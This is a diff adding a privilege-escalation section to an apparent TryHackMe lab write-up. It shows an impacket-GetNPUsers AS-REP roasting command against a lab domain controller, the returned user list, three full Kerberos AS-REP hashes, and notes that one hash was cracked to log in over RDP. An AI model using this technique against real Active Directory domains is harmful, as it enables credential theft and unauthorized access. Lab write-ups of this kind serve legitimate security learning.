@@ -218,5 +218,32 @@ now we login winrm using the creds
 
 ## Privilege Escalation 
 
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/reset]
+└─$ impacket-GetNPUsers -dc-ip 10.10.28.85 -outputfile hashes.asreproast1 thm.corp/automate
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+Password:
+Name           MemberOf                                                      PasswordLastSet             LastLogon                   UAC      
+-------------  ------------------------------------------------------------  --------------------------  --------------------------  --------
+ERNESTO_SILVA  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-07-18 17:21:44.224354  <never>                     0x410200 
+TABATHA_BRITT  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-08-21 21:32:59.571306  2024-02-12 10:53:43.351860  0x410200 
+LEANN_LONG     CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-07-18 17:21:44.161807  2023-06-16 13:16:11.147334  0x410200 
+
+
+
+$krb5asrep$23$ERNESTO_SILVA@THM.CORP:b78d6389727807da2be0c7639f70f6c8$104a3b6f36e4c2b5d64c278e237c422716314c44b2d2e3cb6af1b41f9971b6912b887fcccde2223bded36671b22a952776efd7f8903b060359f2ad304d2014b156c78cf31866cc94faf267e38eee547a55b1fd0725f5e744dd1510f269ca70717e3704b2992b2637d83bb4ff40791680dd2e3d1f70c95d1be9ab9fc648056c5b99f366668d0c6c268b0458ccd4247e6a94d170655e7dbf74f397154d705084970430f4aa659b6311332caf097c28605f6a969bdaaf0f6cdc831253c3e65f085659e37c72ba58131f19e93f8ab86830de415b9498b04228610d2e01798ebff570ad9c5e43
+$krb5asrep$23$TABATHA_BRITT@THM.CORP:966df1fbdb26214dc1b709d6fc90f60f$8c1f5a04dd24d0e88a10d1bc9c966e63f8d3141ffb078cafbd64a658bd7a4e8d5d505763a4f9ce60e59764de2206cbaa872fb32dcbbf8c53496d61b91ef7c66d2625eaed0857e78f9ad34f48f33c602a059c29732c5d654150be45211ab2e87c5f546c29f11fe93c590ee0ee720f12484f271cc90500a3d88126f2981a3728a6dbf10d05c666cbd892ae0962c0bfdf4711174a62489b47d600c7d213b600263566c50ac032a6a6cc8ef8834e5ce5df968c3ad17b8c077b9ce7e7c92ba38a56eba23160dddd5849950a38650be645f8bde0892de80e27fa8e9901e59313be9cd88b70a250
+$krb5asrep$23$LEANN_LONG@THM.CORP:6c5b61225737a8ad7b97714634e272a9$f35ad11a2ad25939355c70b5a39c8d77b7fe91c6449ae641d321cb527e0b150f3bd47586f589fbfab616744489420c8273db4695cf23ea531b77a856e6e588fe079a1ed15e0d1c1b2df25b79ae6b6c6dd3b9711204fce4c223f877738b2cbae83d1ebaeb24e7cebf3c4ad307686be910c2da16cf18ae04b8d7d04b0ab0fd75fc4a41e609d35c718b9beed58b0694338fd125a5c9f94c8c012c998c653dc766f020576e33d630f9802c8b685df3b0039b25f10ea3812c5e76e9132f7e01d04550e4ba6434cf191b85ced57582dc61827a48b05414c6aac77390bf4e42c64f3293281f5296
+```
+checkng for list of kerberoastable accts, we got some hashes. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6656b0f6-80e3-4370-87cd-9c6e56672008)
+
+cracked the hash. we got password for user `TABATHA_BRITT`.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/222642f1-16e0-4b29-b99d-1fd87b7b50d8)
+
+login rdp as user `TABATHA_BRITT`. 
 
 
